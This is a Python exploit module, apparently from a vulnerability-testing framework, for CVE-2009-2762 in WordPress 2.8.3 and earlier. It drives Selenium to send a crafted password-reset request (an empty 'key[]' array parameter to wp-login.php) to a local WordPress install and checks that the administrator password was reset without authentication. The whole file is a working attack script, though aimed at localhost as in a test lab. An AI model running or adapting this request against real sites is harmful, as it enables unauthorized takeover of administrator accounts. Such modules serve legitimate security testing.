import sys
import os
import time

import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "CVE_2009_2762",
                  'Description' : "Wordpress 2.8.3 and lower is vulnerable to remote password reset without authentication",
                  'References' :  [['http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-2762']], 
                  'Target' :      "Wordpress 2.8.3",
                  'TargetLicense' : '',
                  #'Plugin' : "",
                  'VulWikiPage' : "N/A",
                  'Type' : 'Cred'
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
            

    def exploit(self):
        driver = self.create_selenium_driver(javascript=False)
        
        driver.get("http://127.0.0.1/wordpress/wp-login.php?action=rp&key[]=")
        
        element = driver.get_element(by_xpath="//p[text()[contains(.,'The e-mail could not be sent.')]]", delay=5)
        self.logger.info("Admin Password Reset. Exploit Successful.")
        if self.visible:
            time.sleep(10)

        driver.cleanup()
        return
